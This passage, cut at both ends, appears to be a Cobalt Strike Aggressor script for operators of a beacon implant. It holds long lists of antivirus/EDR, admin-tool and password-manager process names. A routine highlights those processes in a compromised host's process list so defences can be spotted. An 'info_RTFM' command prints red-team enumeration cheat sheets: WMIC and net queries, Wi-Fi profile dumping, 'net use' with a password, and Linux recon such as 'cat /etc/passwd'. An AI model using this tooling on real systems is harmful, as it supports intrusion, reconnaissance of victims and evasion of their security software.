"avgvv.exe", "avgw.exe", "avgwb.exe", "avgwdsvc.exe", "avgwizfw.exe", "avkpop.exe", "avkserv.exe", "avkservice.exe", "avkwctl9.exe", "avltmain.exe", "avmailc.exe", "avmcdlg.exe", "avnotify.exe", "avnt.exe", "avp.exe", "avp32.exe", "avpcc.exe", "avpdos32.exe", "avpexec.exe", "avpm.exe", "avpncc.exe", "avps.exe", "avptc32.exe", "avpupd.exe", "avscan.exe", "avsched32.exe", "avserver.exe", "avshadow.exe", "avsynmgr.exe", "avwebgrd.exe", "avwin.exe", "avwin95.exe", "avwinnt.exe", "avwupd.exe", "avwupd32.exe", "avwupsrv.exe", "avxmonitor9x.exe", "avxmonitornt.exe", "avxquar.exe", "backweb.exe", "bargains.exe", "basfipm.exe", "bd_professional.exe", "bdagent.exe", "bdc.exe", "bdlite.exe", "bdmcon.exe", "bdss.exe", "bdsubmit.exe", "beagle.exe", "belt.exe", "bidef.exe", "bidserver.exe", "bipcp.exe", "bipcpevalsetup.exe", "bisp.exe", "blackd.exe", "blackice.exe", "blink.exe", "blss.exe", "bmrt.exe", "bootconf.exe", "bootwarn.exe", "borg2.exe", "bpc.exe", "bpk.exe", "brasil.exe", "bs120.exe", "bundle.exe", "bvt.exe", "bwgo0000.exe", "ca.exe", "caav.exe", "caavcmdscan.exe", "caavguiscan.exe", "caf.exe", "cafw.exe", "caissdt.exe", "capfaem.exe", "capfasem.exe", "capfsem.exe", "capmuamagt.exe", "casc.exe", "casecuritycenter.exe", "caunst.exe", "cavrep.exe", "cavrid.exe", "cavscan.exe", "cavtray.exe", "ccApp.exe", "ccEvtMgr.exe", "ccLgView.exe", "ccProxy.exe", "ccSetMgr.exe", "ccSetmgr.exe", "ccSvcHst.exe", "ccap.exe", "ccapp.exe", "ccevtmgr.exe", "cclaw.exe", "ccnfagent.exe", "ccprovsp.exe", "ccproxy.exe", "ccpxysvc.exe", "ccschedulersvc.exe", "ccsetmgr.exe", "ccsmagtd.exe", "ccsvchst.exe", "ccsystemreport.exe", "cctray.exe", "ccupdate.exe", "cdp.exe", "cfd.exe", "cfftplugin.exe", "cfgwiz.exe", "cfiadmin.exe", "cfiaudit.exe", "cfinet.exe", "cfinet32.exe", "cfnotsrvd.exe", "cfp.exe", "cfpconfg.exe", "cfpconfig.exe", "cfplogvw.exe", "cfpsbmit.exe", "cfpupdat.exe", "cfsmsmd.exe", "checkup.exe", "cka.exe", "clamscan.exe", "claw95.exe", "claw95cf.exe", "clean.exe", "cleaner.exe", "cleaner3.exe", "cleanpc.exe", "cleanup.exe", "click.exe", "cmdagent.exe", "cmdinstall.exe", "cmesys.exe", "cmgrdian.exe", "cmon016.exe", "comHost.exe", "connectionmonitor.exe", "control_panel.exe", "cpd.exe", "cpdclnt.exe", "cpf.exe", "cpf9x206.exe", "cpfnt206.exe", "crashrep.exe", "csacontrol.exe", "csinject.exe", "csinsm32.exe", "csinsmnt.exe", "csrss_tc.exe", "ctrl.exe", "cv.exe", "cwnb181.exe", "cwntdwmo.exe", "cz.exe", "datemanager.exe", "dbserv.exe", "dbsrv9.exe", "dcomx.exe", "defalert.exe", "defscangui.exe", "defwatch.exe", "deloeminfs.exe", "deputy.exe", "diskmon.exe", "divx.exe", "djsnetcn.exe", "dllcache.exe", "dllreg.exe", "doors.exe", "doscan.exe", "dpf.exe", "dpfsetup.exe", "dpps2.exe", "drwagntd.exe", "drwatson.exe", "drweb.exe", "drweb32.exe", "drweb32w.exe", "drweb386.exe", "drwebcgp.exe", "drwebcom.exe", "drwebdc.exe", "drwebmng.exe", "drwebscd.exe", "drwebupw.exe", "drwebwcl.exe", "drwebwin.exe", "drwupgrade.exe", "dsmain.exe", "dssagent.exe", "dvp95.exe", "dvp95_0.exe", "dwengine.exe", "dwhwizrd.exe", "dwwin.exe", "ecengine.exe", "edisk.exe", "efpeadm.exe", "egui.exe", "ekrn.exe", "elogsvc.exe", "emet_agent.exe", "emet_service.exe", "emsw.exe", "engineserver.exe", "ent.exe", "era.exe", "esafe.exe", "escanhnt.exe", "escanv95.exe", "esecagntservice.exe", "esecservice.exe", "esmagent.exe", "espwatch.exe", "etagent.exe", "ethereal.exe", "etrustcipe.exe", "evpn.exe", "evtProcessEcFile.exe", "evtarmgr.exe", "evtmgr.exe", "exantivirus-cnet.exe", "exe.avxw.exe", "execstat.exe", "expert.exe", "explore.exe", "f-agnt95.exe", "f-prot.exe", "f-prot95.exe", "f-stopw.exe", "fameh32.exe", "fast.exe", "fch32.exe", "fih32.exe", "findviru.exe", "firesvc.exe", "firetray.exe", "firewall.exe", "fmon.exe", "fnrb32.exe", "fortifw.exe", "fp-win.exe", "fp-win_trial.exe", "fprot.exe", "frameworkservice.exe", "frminst.exe", "frw.exe", "fsaa.exe", "fsaua.exe", "fsav.exe", "fsav32.exe", "fsav530stbyb.exe", "fsav530wtbyb.exe", "fsav95.exe", "fsavgui.exe", "fscuif.exe", "fsdfwd.exe", "fsgk32.exe", "fsgk32st.exe", "fsguidll.exe", "fsguiexe.exe", "fshdll32.exe", "fsm32.exe", "fsma32.exe", "fsmb32.exe", "fsorsp.exe", "fspc.exe", "fspex.exe", "fsqh.exe", "fssm32.exe", "fwinst.exe", "gator.exe", "gbmenu.exe", "gbpoll.exe", "gcascleaner.exe", "gcasdtserv.exe", "gcasinstallhelper.exe", "gcasnotice.exe", "gcasserv.exe", "gcasservalert.exe", "gcasswupdater.exe", "generics.exe", "gfireporterservice.exe", "ghost_2.exe", "ghosttray.exe", "giantantispywaremain.exe", "giantantispywareupdater.exe", "gmt.exe", "guard.exe", "guarddog.exe", "guardgui.exe", "hacktracersetup.exe", "hbinst.exe", "hbsrv.exe", "hipsvc.exe", "hotactio.exe", "hotpatch.exe", "htlog.exe", "htpatch.exe", "hwpe.exe", "hxdl.exe", "hxiul.exe", "iamapp.exe", "iamserv.exe", "iamstats.exe", "ibmasn.exe", "ibmavsp.exe", "icepack.exe", "icload95.exe", "icloadnt.exe", "icmon.exe", "icsupp95.exe", "icsuppnt.exe", "idle.exe", "iedll.exe", "iedriver.exe", "iface.exe", "ifw2000.exe", "igateway.exe", "inetlnfo.exe", "infus.exe", "infwin.exe", "inicio.exe", "init.exe", "inonmsrv.exe", "inorpc.exe", "inort.exe", "inotask.exe", "intdel.exe", "intren.exe", "iomon98.exe", "isPwdSvc.exe", "isUAC.exe", "isafe.exe", "isafinst.exe", "issvc.exe", "istsvc.exe", "jammer.exe", "jdbgmrg.exe", "jedi.exe", "kaccore.exe", "kansgui.exe", "kansvr.exe", "kastray.exe", "kav.exe", "kav32.exe", "kavfs.exe", "kavfsgt.exe", "kavfsrcn.exe", "kavfsscs.exe", "kavfswp.exe", "kavisarv.exe", "kavlite40eng.exe", "kavlotsingleton.exe", "kavmm.exe", "kavpers40eng.exe", "kavpf.exe", "kavshell.exe", "kavss.exe", "kavstart.exe", "kavsvc.exe", "kavtray.exe", "kazza.exe", "keenvalue.exe", "kerio-pf-213-en-win.exe", "kerio-wrl-421-en-win.exe", "kerio-wrp-421-en-win.exe", "kernel32.exe", "killprocesssetup161.exe", "kis.exe", "kislive.exe", "kissvc.exe", "klnacserver.exe", "klnagent.exe", "klserver.exe", "klswd.exe", "klwtblfs.exe", "kmailmon.exe", "knownsvr.exe", "kpf4gui.exe", "kpf4ss.exe", "kpfw32.exe", "kpfwsvc.exe", "krbcc32s.exe", "kvdetech.exe", "kvolself.exe", "kvsrvxp.exe", "kvsrvxp_1.exe", "kwatch.exe", "kwsprod.exe", "kxeserv.exe", "launcher.exe", "ldnetmon.exe", "ldpro.exe", "ldpromenu.exe", "ldscan.exe", "leventmgr.exe", "livesrv.exe", "lmon.exe", "lnetinfo.exe", "loader.exe", "localnet.exe", "lockdown.exe", "lockdown2000.exe", "log_qtine.exe", "lookout.exe", "lordpe.exe", "lsetup.exe", "luall.exe", "luau.exe", "lucallbackproxy.exe", "lucoms.exe", "lucomserver.exe", "lucoms~1.exe", "luinit.exe", "luspt.exe", "makereport.exe", "mantispm.exe", "mapisvc32.exe", "masalert.exe", "massrv.exe", "mcafeefire.exe", "mcagent.exe", "mcappins.exe", "mcconsol.exe", "mcdash.exe", "mcdetect.exe", "mcepoc.exe", "mcepocfg.exe", "mcinfo.exe", "mcmnhdlr.exe", "mcmscsvc.exe", "mcods.exe", "mcpalmcfg.exe", "mcpromgr.exe", "mcregwiz.exe", "mcscript.exe", "mcscript_inuse.exe", "mcshell.exe", "mcshield.exe", "mcshld9x.exe", "mcsysmon.exe", "mctool.exe", "mctray.exe", "mctskshd.exe", "mcuimgr.exe", "mcupdate.exe", "mcupdmgr.exe", "mcvsftsn.exe", "mcvsrte.exe", "mcvsshld.exe", "mcwce.exe", "mcwcecfg.exe", "md.exe", "mfeann.exe", "mfevtps.exe", "mfin32.exe", "mfw2en.exe", "mfweng3.02d30.exe", "mgavrtcl.exe", "mgavrte.exe", "mghtml.exe", "mgui.exe", "minilog.exe", "mmod.exe", "monitor.exe", "monsvcnt.exe", "monsysnt.exe", "moolive.exe", "mostat.exe", "mpcmdrun.exe", "mpf.exe", "mpfagent.exe", "mpfconsole.exe", "mpfservice.exe", "mpftray.exe", "mps.exe", "mpsevh.exe", "mpsvc.exe", "mrf.exe", "mrflux.exe", "msapp.exe", "msascui.exe", "msbb.exe", "msblast.exe", "mscache.exe", "msccn32.exe", "mscifapp.exe", "mscman.exe", "msconfig.exe", "msdm.exe", "msdos.exe", "msiexec16.exe", "mskagent.exe", "mskdetct.exe", "msksrver.exe", "msksrvr.exe", "mslaugh.exe", "msmgt.exe", "msmpeng.exe", "msmsgri32.exe", "msscli.exe", "msseces.exe", "mssmmc32.exe", "msssrv.exe", "mssys.exe", "msvxd.exe", "mu0311ad.exe", "mwatch.exe", "myagttry.exe", "n32scanw.exe", "nSMDemf.exe", "nSMDmon.exe", "nSMDreal.exe", "nSMDsch.exe", "naPrdMgr.exe", "nav.exe", "navap.navapsvc.exe", "navapsvc.exe", "navapw32.exe", "navdx.exe", "navlu32.exe", "navnt.exe", "navstub.exe", "navw32.exe", "navwnt.exe", "nc2000.exe", "ncinst4.exe", "MSASCuiL.exe");
    @av1 = @("MBAMService.exe", "mbamtray.exe", "CylanceSvc.exe", "ndd32.exe", "ndetect.exe", "neomonitor.exe", "neotrace.exe", "neowatchlog.exe", "netalertclient.exe", "netarmor.exe", "netcfg.exe", "netd32.exe", "netinfo.exe", "netmon.exe", "netscanpro.exe", "netspyhunter-1.2.exe", "netstat.exe", "netutils.exe", "networx.exe", "ngctw32.exe", "ngserver.exe", "nip.exe", "nipsvc.exe", "nisoptui.exe", "nisserv.exe", "nisum.exe", "njeeves.exe", "nlsvc.exe", "nmain.exe", "nod32.exe", "nod32krn.exe", "nod32kui.exe", "normist.exe", "norton_internet_secu_3.0_407.exe", "notstart.exe", "npf40_tw_98_nt_me_2k.exe", "npfmessenger.exe", "npfmntor.exe", "npfmsg.exe", "nprotect.exe", "npscheck.exe", "npssvc.exe", "nrmenctb.exe", "nsched32.exe", "nscsrvce.exe", "nsctop.exe", "nsmdtr.exe", "nssys32.exe", "nstask32.exe", "nsupdate.exe", "nt.exe", "ntcaagent.exe", "ntcadaemon.exe", "ntcaservice.exe", "ntrtscan.exe", "ntvdm.exe", "ntxconfig.exe", "nui.exe", "nupgrade.exe", "nvarch16.exe", "nvc95.exe", "nvcoas.exe", "nvcsched.exe", "nvsvc32.exe", "nwinst4.exe", "nwservice.exe", "nwtool16.exe", "nymse.exe", "oasclnt.exe", "oespamtest.exe", "ofcdog.exe", "ofcpfwsvc.exe", "okclient.exe", "olfsnt40.exe", "ollydbg.exe", "onsrvr.exe", "op_viewer.exe", "opscan.exe", "optimize.exe", "ostronet.exe", "otfix.exe", "outpost.exe", "outpostinstall.exe", "outpostproinstall.exe", "paamsrv.exe", "padmin.exe", "pagent.exe", "pagentwd.exe", "panixk.exe", "patch.exe", "pavbckpt.exe", "pavcl.exe", "pavfires.exe", "pavfnsvr.exe", "pavjobs.exe", "pavkre.exe", "pavmail.exe", "pavprot.exe", "pavproxy.exe", "pavprsrv.exe", "pavsched.exe", "pavsrv50.exe", "pavsrv51.exe", "pavsrv52.exe", "pavupg.exe", "pavw.exe", "pccNT.exe", "pccclient.exe", "pccguide.exe", "pcclient.exe", "pccnt.exe", "pccntmon.exe", "pccntupd.exe", "pccpfw.exe", "pcctlcom.exe", "pccwin98.exe", "pcfwallicon.exe", "pcip10117_0.exe", "pcscan.exe", "pctsAuxs.exe", "pctsGui.exe", "pctsSvc.exe", "pctsTray.exe", "pdsetup.exe", "pep.exe", "periscope.exe", "persfw.exe", "perswf.exe", "pf2.exe", "pfwadmin.exe", "pgmonitr.exe", "pingscan.exe", "platin.exe", "pmon.exe", "pnmsrv.exe", "pntiomon.exe", "pop3pack.exe", "pop3trap.exe", "poproxy.exe", "popscan.exe", "portdetective.exe", "portmonitor.exe", "powerscan.exe", "ppinupdt.exe", "ppmcativedetection.exe", "pptbc.exe", "ppvstop.exe", "pqibrowser.exe", "pqv2isvc.exe", "prevsrv.exe", "prizesurfer.exe", "prmt.exe", "prmvr.exe", "programauditor.exe", "proport.exe", "protectx.exe", "psctris.exe", "psh_svc.exe", "psimreal.exe", "psimsvc.exe", "pskmssvc.exe", "pspf.exe", "purge.exe", "pview.exe", "pviewer.exe", "pxemtftp.exe", "pxeservice.exe", "qclean.exe", "qconsole.exe", "qdcsfs.exe", "qoeloader.exe", "qserver.exe", "rapapp.exe", "rapuisvc.exe", "ras.exe", "rasupd.exe", "rav7.exe", "rav7win.exe", "rav8win32eng.exe", "ravmon.exe", "ravmond.exe", "ravstub.exe", "ravxp.exe", "ray.exe", "rb32.exe", "rcsvcmon.exe", "rcsync.exe", "realmon.exe", "reged.exe", "remupd.exe", "reportsvc.exe", "rescue.exe", "rescue32.exe", "rfwmain.exe", "rfwproxy.exe", "rfwsrv.exe", "rfwstub.exe", "rnav.exe", "rrguard.exe", "rshell.exe", "rsnetsvr.exe", "rstray.exe", "rtvscan.exe", "rtvscn95.exe", "rulaunch.exe", "saHookMain.exe", "safeboxtray.exe", "safeweb.exe", "sahagent.exescan32.exe", "sav32cli.exe", "save.exe", "savenow.exe", "savroam.exe", "savscan.exe", "savservice.exe", "sbserv.exe", "scam32.exe", "scan32.exe", "scan95.exe", "scanexplicit.exe", "scanfrm.exe", "scanmailoutlook.exe", "scanpm.exe", "schdsrvc.exe", "schupd.exe", "scrscan.exe", "seestat.exe", "serv95.exe", "setloadorder.exe", "setup_flowprotector_us.exe", "setupguimngr.exe", "setupvameeval.exe", "sfc.exe", "sgssfw32.exe", "sh.exe", "shellspyinstall.exe", "shn.exe", "showbehind.exe", "shstat.exe", "siteadv.exe", "smOutlookPack.exe", "smc.exe", "smoutlookpack.exe", "sms.exe", "smsesp.exe", "smss32.exe", "sndmon.exe", "sndsrvc.exe", "soap.exe", "sofi.exe", "softManager.exe", "spbbcsvc.exe", "spf.exe", "sphinx.exe", "spideragent.exe", "spiderml.exe", "spidernt.exe", "spiderui.exe", "spntsvc.exe", "spoler.exe", "spoolcv.exe", "spoolsv32.exe", "spyxx.exe", "srexe.exe", "srng.exe", "srvload.exe", "srvmon.exe", "ss3edit.exe", "sschk.exe", "ssg_4104.exe", "ssgrate.exe", "st2.exe", "stcloader.exe", "stinger.exe", "stopp.exe", "stwatchdog.exe", "supftrl.exe", "support.exe", "supporter5.exe", "svcGenericHost", "svcharge.exe", "svchostc.exe", "svchosts.exe", "svcntaux.exe", "svdealer.exe", "svframe.exe", "svtray.exe", "swdsvc.exe", "sweep95.exe", "sweepnet.sweepsrv.sys.swnetsup.exe", "sweepsrv.exe", "swnetsup.exe", "swnxt.exe", "swserver.exe", "symlcsvc.exe", "symproxysvc.exe", "symsport.exe", "symtray.exe", "symwsc.exe", "sysdoc32.exe", "sysedit.exe", "sysupd.exe", "taskmo.exe", "taumon.exe", "tbmon.exe", "tbscan.exe", "tc.exe", "tca.exe", "tclproc.exe", "tcm.exe", "tdimon.exe", "tds-3.exe", "tds2-98.exe", "tds2-nt.exe", "teekids.exe", "tfak.exe", "tfak5.exe", "tgbob.exe", "titanin.exe", "titaninxp.exe", "tmas.exe", "tmlisten.exe", "tmntsrv.exe", "tmpfw.exe", "tmproxy.exe", "tnbutil.exe", "tpsrv.exe", "tracesweeper.exe", "trickler.exe", "trjscan.exe", "trjsetup.exe", "trojantrap3.exe", "trupd.exe", "tsadbot.exe", "tvmd.exe", "tvtmd.exe", "udaterui.exe", "undoboot.exe", "unvet32.exe", "updat.exe", "updtnv28.exe", "upfile.exe", "upgrad.exe", "uplive.exe", "urllstck.exe", "usergate.exe", "usrprmpt.exe", "utpost.exe", "v2iconsole.exe", "v3clnsrv.exe", "v3exec.exe", "v3imscn.exe", "vbcmserv.exe", "vbcons.exe", "vbust.exe", "vbwin9x.exe", "vbwinntw.exe", "vcsetup.exe", "vet32.exe", "vet95.exe", "vetmsg.exe", "vettray.exe", "vfsetup.exe", "vir-help.exe", "virusmdpersonalfirewall.exe", "vnlan300.exe", "vnpc3000.exe", "vpatch.exe", "vpc32.exe", "vpc42.exe", "vpfw30s.exe", "vprosvc.exe", "vptray.exe", "vrv.exe", "vrvmail.exe", "vrvmon.exe", "vrvnet.exe", "vscan40.exe", "vscenu6.02d30.exe", "vsched.exe", "vsecomr.exe", "vshwin32.exe", "vsisetup.exe", "vsmain.exe", "vsmon.exe", "vsserv.exe", "vsstat.exe", "vstskmgr.exe", "vswin9xe.exe", "vswinntse.exe", "vswinperse.exe", "w32dsm89.exe", "w9x.exe", "watchdog.exe", "webdav.exe", "webproxy.exe", "webscanx.exe", "webtrap.exe", "webtrapnt.exe", "wfindv32.exe", "wfxctl32.exe", "wfxmod32.exe", "wfxsnt40.exe", "whoswatchingme.exe", "wimmun32.exe", "win-bugsfix.exe", "winactive.exe", "winmain.exe", "winnet.exe", "winppr32.exe", "winrecon.exe", "winroute.exe", "winservn.exe", "winssk32.exe", "winstart.exe", "winstart001.exe", "wintsk32.exe", "winupdate.exe", "wkufind.exe", "wnad.exe", "wnt.exe", "wradmin.exe", "wrctrl.exe", "wsbgate.exe", "wssfcmai.exe", "wupdater.exe", "wupdt.exe", "wyvernworksfirewall.exe", "xagt.exe", "xagtnotif.exe", "xcommsvr.exe", "xfilter.exe", "xpf202en.exe", "zanda.exe", "zapro.exe", "zapsetup3001.exe", "zatutor.exe", "zhudongfangyu.exe", "zlclient.exe", "zlh.exe", "zonalm2601.exe", "zonealarm.exe", "cb.exe", "MsMpEng.exe", "MsSense.exe", "CSFalconService.exe", "CSFalconContainer.exe", "redcloak.exe", "OmniAgent.exe","CrAmTray.exe","AmSvc.exe","minionhost.exe","PylumLoader.exe","CrsSvc.exe");
    @admin = @("MobaXterm.exe", "bash.exe", "git-bash.exe", "mmc.exe", "Code.exe", "notepad++.exe", "notepad.exe", "cmd.exe", "drwatson.exe", "DRWTSN32.EXE", "drwtsn32.exe", "dumpcap.exe", "ethereal.exe", "filemon.exe", "idag.exe", "idaw.exe", "k1205.exe", "loader32.exe", "netmon.exe", "netstat.exe", "netxray.exe", "NmWebService.exe", "nukenabber.exe", "portmon.exe", "powershell.exe", "PRTG Traffic Gr.exe", "PRTG Traffic Grapher.exe", "prtgwatchdog.exe", "putty.exe", "regmon.exe", "SystemEye.exe", "taskman.exe", "TASKMGR.EXE", "tcpview.exe", "Totalcmd.exe", "TrafMonitor.exe", "windbg.exe", "winobj.exe", "wireshark.exe", "WMonAvNScan.exe", "WMonAvScan.exe", "WMonSrv.exe","regedit.exe", "regedit32.exe", "accesschk.exe", "accesschk64.exe", "AccessEnum.exe", "ADExplorer.exe", "ADInsight.exe", "adrestore.exe", "Autologon.exe", "Autoruns.exe", "Autoruns64.exe", "autorunsc.exe", "autorunsc64.exe", "Bginfo.exe", "Bginfo64.exe", "Cacheset.exe", "Clockres.exe", "Clockres64.exe", "Contig.exe", "Contig64.exe", "Coreinfo.exe", "ctrl2cap.exe", "Dbgview.exe", "Desktops.exe", "disk2vhd.exe", "diskext.exe", "diskext64.exe", "Diskmon.exe", "DiskView.exe", "du.exe", "du64.exe", "efsdump.exe", "FindLinks.exe", "FindLinks64.exe", "handle.exe", "handle64.exe", "hex2dec.exe", "hex2dec64.exe", "junction.exe", "junction64.exe", "ldmdump.exe", "Listdlls.exe", "Listdlls64.exe", "livekd.exe", "livekd64.exe", "LoadOrd.exe", "LoadOrd64.exe", "LoadOrdC.exe", "LoadOrdC64.exe", "logonsessions.exe", "logonsessions64.exe", "movefile.exe", "movefile64.exe", "notmyfault.exe", "notmyfault64.exe", "notmyfaultc.exe", "notmyfaultc64.exe", "ntfsinfo.exe", "ntfsinfo64.exe", "pagedfrg.exe", "pendmoves.exe", "pendmoves64.exe", "pipelist.exe", "pipelist64.exe", "portmon.exe", "procdump.exe", "procdump64.exe", "procexp.exe", "procexp64.exe", "Procmon.exe", "PsExec.exe", "PsExec64.exe", "psfile.exe", "psfile64.exe", "PsGetsid.exe", "PsGetsid64.exe", "PsInfo.exe", "PsInfo64.exe", "pskill.exe", "pskill64.exe", "pslist.exe", "pslist64.exe", "PsLoggedon.exe", "PsLoggedon64.exe", "psloglist.exe", "pspasswd.exe", "pspasswd64.exe", "psping.exe", "psping64.exe", "PsService.exe", "PsService64.exe", "psshutdown.exe", "pssuspend.exe", "pssuspend64.exe", "RAMMap.exe", "RegDelNull.exe", "RegDelNull64.exe", "regjump.exe", "ru.exe", "ru64.exe", "sdelete.exe", "sdelete64.exe", "ShareEnum.exe", "ShellRunas.exe", "sigcheck.exe", "sigcheck64.exe", "streams.exe", "streams64.exe", "strings.exe", "strings64.exe", "sync.exe", "sync64.exe", "Sysmon.exe", "Sysmon64.exe", "Tcpvcon.exe", "Tcpview.exe", "Testlimit.exe", "Testlimit64.exe", "vmmap.exe", "Volumeid.exe", "Volumeid64.exe", "whois.exe", "whois64.exe", "Winobj.exe", "ZoomIt.exe", "KeePass.exe", "1Password.exe", "lastpass.exe");
	
	local('$outps $temp $name $ppid $pid $arch $user $session @ps');
	$outps .= "\cC[*]\o Process List with process highlighting\n";
	$outps .= "\cC[*]\o Current Running PID: \c8 Yellow ". $bd['pid'] ." \o \n";
	$outps .= "\cC[*]\o Explorer/Winlogon: \c2 BLUE \o \n";
	$outps .= "\cC[*]\o Admin Tools: \cB LIGHT BLUE \o \n";
	$outps .= "\cC[*]\o Browsers: \c3 GREEN \o \n";
	$outps .= "\cC[*]\o AV/EDR: \c4 RED \o \n\n";
	$outps .= " PID   PPID  Name                         Arch  Session     User\n";
	$outps .= "\cE ---   ----  ----                         ----  -------     -----\n";

	foreach $temp (split("\n", ["$2" trim])) {
		($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
		# highlight AV processes in RED.
		if(iff($name in @av,true,false)) {
		push(@ps, %(pid => $pid, entry => "\c4 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
		# highlight current process in YELLOW
		} else if ($pid eq $bd['pid']) {
		push(@ps, %(pid => $pid, entry => "\c8 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
		# highlight explorer , winlogon in BLUE
		} else if ($name eq "explorer.exe" || $name eq "winlogon.exe") {
		push(@ps, %(pid => $pid, entry => "\c2 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
		# highlight browsers processes in GREEN
		} else if ($name eq "chrome.exe" || $name eq "firefox.exe" || $name eq "iexplore.exe" || $name eq "MicrosoftEdgeCP.exe" || $name eq "MicrosoftEdge.exe") {
		push(@ps, %(pid => $pid, entry => "\c3 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
		# highlight av1 processes in RED.
		} else if(iff($name in @av1,true,false)) {
		push(@ps, %(pid => $pid, entry => "\c4 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
		# highlight Admin Tools in Light Blue
		} else if(iff($name in @admin,true,false)) {
		push(@ps, %(pid => $pid, entry => "\cB $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
		} else {
		push(@ps, %(pid => $pid, entry => " $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user"));
		}
	}
	# sort the processes please
	sort({ return $1['pid'] <=> $2['pid']; }, @ps);
	# append to our outstring
	foreach $temp (@ps) {
		$outps .= "$temp['entry'] \n";
	}
	return $outps;
}







beacon_command_register("info_RTFM", "A large repository of commands and red team tips",
	"\nSyntax: info_RTFM [Option]\n" .
	"\nList Options: info_RTFM [List]\n" .
	"\nDisplays well known commands for an OS, or diplays great tips or tricks for a Red Team Operator.\n");

alias info_RTFM {

	if ($2 ismatch 'List') {
		local('$out');
		#blog($1, "\c0\n\nRepo Options\n============");
		$out = "info_RTFM Options\n";
		$out .= "    \c0===============\n\n";
		$out .= "    Option                   Description\n";
		$out .= "\c0    ------                   -----------\n";
		blog($1, $out);
		blog2($1, "\cBWindows                  Windows Enumeration Commands");
		blog2($1, "\cBLinux                    Linux Enumeration Commands");
		blog2($1, "\cBTips                     Red Team Tips");
		blog2($1, "\cBList                     List of Options");
		blog2($1, "\cBSmile                    Happy Hacking!\n");

	}

	if ($2 ismatch 'Windows') {

		blog($1, "\t\c4====== Common Windows Commands ======\n");

		#WMIC Commands
		blog($1, "\t\c4====== WMIC Enumeration Commands ======\n");

		blog2($1, "\t\cBwmic computersystem get Name,domain,NumberofProcessors,Roles,totalphysicalmemory");
		blog2($1, "\t\cBwmic desktop get Name,ScreenSaverActive,Wallpaper");
		blog2($1, "\t\cBwmic netlogin get Caption,Privileges,UserID,UserType,NumberOfLogons,PasswordAge,LogonServer,Workstations");
		blog2($1, "\t\cBwmic process get CSName,Description,ExecutablePath,ProcessId");
		blog2($1, "\t\cBwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName");
		blog2($1, "\t\cBwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace");
		blog2($1, "\t\cBwmic netuse list full");
		blog2($1, "\t\cBwmic startup get Caption,Command,Location,User");
		blog2($1, "\t\cBwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version");
		blog2($1, "\t\cBwmic qfe get HotFixID,InstalledOn");
		blog2($1, "\t\cBwmic ntdomain list");
		blog2($1, "\t\cBwmic bios [list full]\n");

		blog($1, "\t\c4====== Info Harvesting ======\n");
		#Host Enumeration
		blog2($1, "\t\cBsysteminfo");
		blog2($1, "\t\cBsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"");
		blog2($1, "\t\cBSET");
		blog2($1, "\t\cBipconfig /all");
		blog2($1, "\t\cBroute print");
		blog2($1, "\t\cBarp -a");
		blog2($1, "\t\cBnetstat -ano | findstr /I listening");
		blog2($1, "\t\cBnetstat -ano | findstr /I established");
		blog2($1, "\t\cBnbtstat -A *target IP*");
		blog2($1, "\t\cBnslookup");
		blog2($1, "\t\cBreg query [key]");
		blog2($1, "\t\cBGet-ItemProperty [key] (PowerShell)");
		blog2($1, "\t\cBschtasks /query /fo LIST /v");
		blog2($1, "\t\cBsc query");
		blog2($1, "\t\cBsc qc [service name]");
		blog2($1, "\t\cBtasklist /SVC (/S Remote Computer)");
		blog2($1, "\t\cBDRIVERQUERY");
		blog2($1, "\t\cBRun C:\\Windows\\System32\\gatherNetworkInfo.vbs script and check results inside C:\\Windows\\System32\\Config");
		blog2($1, "\t\cBgpresult /z");
		blog2($1, "\t\cBwhoami /all");
		blog2($1, "\t\cBnetsh firewall show conf");
		blog2($1, "\t\cBnetsh wlan show profiles");
		blog2($1, "\t\cBnetsh advfirewall show allprofiles\n");

		blog($1, "\t\c4======= Net Commands =======\n");
		#Old School Net Commands
		blog2($1, "\t\cBnet accounts [/domain]");
		blog2($1, "\t\cBnet group \"groupname\" [/domain]");
		blog2($1, "\t\cBnet localgroup \"groupname\" [/domain]");
		blog2($1, "\t\cBnet view [/domain]");
		blog2($1, "\t\cBnet session");
		blog2($1, "\t\cBnet share");
		blog2($1, "\t\cBnet user [/domain]");
		blog2($1, "\t\cBnet user [username] [/domain]");
		blog2($1, "\t\cBnet use * \\\\IP\\C$ /user:username [password]");
		blog2($1, "\t\cBUse the built in net commands with Beacon! [help net]\n");

	}

	if ($2 ismatch 'Linux') {

		blog($1, "\t\c4====== Common Linux Commands ======\n");

		blog($1, "\t\c4====== Info Harvesting/Host/Network Enumeration ======\n")

		blog2($1, "\t\cBcat /etc/issue");
		blog2($1, "\t\cBcat /etc/*-release");
		blog2($1, "\t\cBcat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'");
		blog2($1, "\t\cBcat /proc/version");
		blog2($1, "\t\cBrpm -q kernel");
		blog2($1, "\t\cBdmesg | grep Linux");
		blog2($1, "\t\cBls /boot | grep vmlinuz-");
		blog2($1, "\t\cBlsb_release -a");
		blog2($1, "\t\cBlast -a");
  		blog2($1, "\t\cBuname -a");
  		blog2($1, "\t\cBuname -mrs");
  		blog2($1, "\t\cBid");
		blog2($1, "\t\cBhistory");
		blog2($1, "\t\cBarp -a");
		blog2($1, "\t\cBnetstat -anot");
		blog2($1, "\t\cBps -elf");
		blog2($1, "\t\cBps -elf | grep root");
		blog2($1, "\t\cBls -la /var/www/html/");
		blog2($1, "\t\cBservice apache2 status");
		blog2($1, "\t\cBcat /etc/resolv.conf");
		blog2($1, "\t\cBcat /etc/networks");
		blog2($1, "\t\cBiptables -L");
		blog2($1, "\t\cBiptables -L -t nat");
		blog2($1, "\t\cBlsof -i");
		blog2($1, "\t\cBcat /etc/services");
		blog2($1, "\t\cBgrep 80 /etc/services");
		blog2($1, "\t\cBw");
		blog2($1, "\t\cBroute -n");
		blog2($1, "\t\cBcat /etc/passwd");
